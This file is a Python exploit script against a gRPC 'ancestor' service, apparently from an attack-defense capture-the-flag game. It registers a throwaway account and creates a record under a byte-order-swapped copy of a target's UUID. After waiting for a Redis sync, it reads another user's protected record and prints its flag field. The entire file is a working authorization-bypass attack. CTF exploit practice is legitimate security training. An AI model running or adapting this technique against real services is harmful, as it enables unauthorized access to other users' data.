#!/usr/bin/env python3.11

import sys
import time
import uuid
from base64 import b64decode

import grpc

from ancestor_grpc.ancestor_pb2 import GetAncestorRequest, AncestorData, AddDirectAncestorRequest
from ancestor_grpc.ancestor_pb2_grpc import AncestorServStub
from auth_grpc.auth_pb2 import RegisterRequest, LoginRequest
from auth_grpc.auth_pb2_grpc import AutherStub

IP = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
PORT = 42424
PUBLIC_FLAG_ID = b64decode(sys.argv[2]) if len(sys.argv) > 2 else ''

LE_PUBLIC_FLAG_ID = uuid.UUID(bytes=PUBLIC_FLAG_ID).bytes_le


def sploit():
    with grpc.insecure_channel(f'{IP}:{PORT}') as channel:
        auth_stub = AutherStub(channel)
        ancestor_stub = AncestorServStub(channel)

        username = str(uuid.uuid4())

        # register new user
        try:
            auth_stub.Register(RegisterRequest(username=username, password='password', species_type='FilthyLizard'))
        except grpc.RpcError:
            pass

        # login to that user
        token = auth_stub.Login(LoginRequest(username=username, password='password')).access_token
        metadata = (('authorization', f'Bearer {token}'),)

        # try to create ancestor with "reversed" uuid
        try:
            ancestor_stub.CreateAncestor(AncestorData(
                id=LE_PUBLIC_FLAG_ID,
                name='abracadabra',
                description='description',
                ancestor_type='FilthyLizard',
                burial_place='123',
            ), metadata=metadata)
        except grpc.RpcError:
            pass

        # add created ancestor to direct ancestors list
        try:
            ancestor_stub.AddDirectAncestor(AddDirectAncestorRequest(ancestor_id=LE_PUBLIC_FLAG_ID), metadata=metadata)
        except grpc.RpcError:
            pass

        # wait for ancestors list transfer to redis
        time.sleep(65)

        # now we have "reverse" of "reverse" uuid => uuid of flag, so we can see burial place of ancestor
        ancestor: AncestorData = ancestor_stub.GetAncestor(GetAncestorRequest(id=PUBLIC_FLAG_ID), metadata=metadata)
        print(ancestor.burial_place)


if __name__ == '__main__':
    sploit()
